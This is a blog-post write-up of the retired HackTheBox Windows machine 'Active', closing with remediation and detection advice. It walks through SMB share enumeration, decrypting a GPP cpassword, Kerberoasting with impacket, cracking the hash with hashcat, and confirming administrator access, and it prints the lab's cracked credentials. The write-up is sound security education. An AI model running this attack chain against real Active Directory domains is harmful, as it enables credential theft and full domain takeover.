---
# ─── Post settings ──────────────────────────────────────────────
# Rename this file to: YYYY-MM-DD-short-slug.md  (e.g. 2026-10-23-htb-cozyhosting.md)
# and drop it in _posts/ when it's ready to publish.
title: "HackTheBox: Active - Easy Windows"
date: 2025-08-29 10:40:21 -0400
categories: [HackTheBox, Windows]        # max 2 levels: [Main, Sub]
tags: [windows, active directory, privesc]          # lowercase, as many as you like
description: >-
  Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.
image:
  path: banner.png
pin: false                           # true = stick to the top of the home page
toc: true
math: false                          # true if you need LaTeX
mermaid: false                       # true if you use mermaid diagrams
---

## Overview

| | |
|---|---|
| **Platform** | HackTheBox |
| **Difficulty** | Easy |
| **OS** | Windows |
| **Key techniques** | AD Enumeration, Kerberoasting |

This box is a very good intro to SMB share permission abuse and kerberoasting.

> This post covers a retired box. Spoilers ahead.
{: .prompt-info }

## Recon

### Port scan

```bash
nmap -A -Pn -p- 10.10.10.100 -oA nmap_out/active.htb
```

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-27 15:04 EDT
Nmap scan report for 10.10.10.100
Host is up (0.035s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-27 19:04:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-27T19:05:21
|_  start_date: 2025-08-27T18:59:59
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

```

Based on this nmap scan a few things stand out. Based on the open ports this is a Windows DC machine. Based on host fingerprinting we can also see this is a Windows Server 2008.
### AD Enumeration

![LDAP and SMB Enum](ldap-enum.png){: w="800" }

## Initial Access

Based on the open ports (LDAP, SMB, RPC) I decided to start enumerating there.

```bash
ldapsearch -x -H ldap://10.10.10.100 -b "dc=active,dc=htb"
```
The first thing I checked was LDAP to see if anyonmous authentication was allowed. Based on the output from the screenshot above LDAP cannot be authenticated to anonymously.

I then checked rpc to see if I could authenticate there, alas I could not.

```bash
nxc smb 10.10.10.100 -u "" -p "" --shares
```

Finally, I tested SMB with NetExec. Based on the output of this command it showed I could authenticate anonymously to SMB and on top of that I had read permissions on the `Replication` share. After connecting to the Replication share and recursively download its contents I found a `Groups.xml` file. Which contains the following contents:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-
8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06"
uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName=""
description=""
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw
/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
userName="active.htb\SVC_TGS"/></User>
</Groups>
```

> note the userName `SVC_TGS` and the encrypted password string in `cpassword=`  
{: .prompt-tip }

We extract the encrypted password form the `Groups.xml` file and decrypt it using `gpp-decrypt`

After decrypting the string we get the following username/password combo:
```text
SVC_TGS/GPPstillStandingStrong2k18
```

After authenticating with this service account we get the user flag.
![Submitted User Flag](user-flag.png){: w="800" }

## Privilege Escalation

![Bloodhound Dump](bloodhound.png){: w="800" }

The bloodhound dump reveals only two other user accounts on the box kerberos and administrator.

Naturally i decide to check if there are kerberostable users.

```bash
┌──(shady㉿kali)-[~/HTB/Active]
└─$ impacket-GetUserSPNs ACTIVE.htb/svc_tgs:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request -outputfile kerberoast_hashes.txt

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-08-27 15:01:18.404174             
```

After running this command it dumped the hashes to `kerberoast_hashes.txt` so I ran hashcat against it:
```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```
cracked the hash (pause) and got the following username/password combo:

```text
administrator/Ticketmaster1968
```
To confirm the credentials I checked authentication to SMB using NetExec:
```bash
┌──(shady㉿kali)-[~/HTB/Active]
└─$ nxc smb 10.10.10.100 -u administrator -p Ticketmaster1968
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.10.10.100    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
```
![Proof of Root](root.png){: w="800" }


## Lessons Learned

- GPP cpassword is reversible by design. Microsoft published the AES key used to encrypt Group Policy Preferences passwords, so anything in a cpassword= field (in Groups.xml, Services.xml, ScheduledTasks.xml, etc.) is effectively plaintext to anyone who can read it. The SYSVOL/Replication share hands it right out.
- Weak/guessable service account passwords collapse the whole domain. Ticketmaster1968 fell to rockyou. Kerberoasting only pays off when the password is crackable, and here the account that cracked was Domain Admin.

## Remediation

How a defender would fix this:

- Use gMSAs for any account with an SPN so offline cracking is infeasible.
- Never assign an SPN to a privileged account. Administrator should not be a service principal. That single misconfig is what turned an offline crack into Domain Admin.
- Disable null sessions and anonymous share enumeration, and review share ACLs so Everyone/Anonymous Logon can’t read sensitive shares like Replication/SYSVOL contents beyond what’s required.

How a defender would detect this:

- Event ID 4769 alert on a single account requesting many distinct SPNs in a short window, and specifically on TGS requests using RC4 encryption, the signature of a Kerberoasting tool forcing the weaker, crackable cipher.
- SMB access to SYSVOL/Replication from anonymous or unexpected sources alert on null-session logons touching those shares.
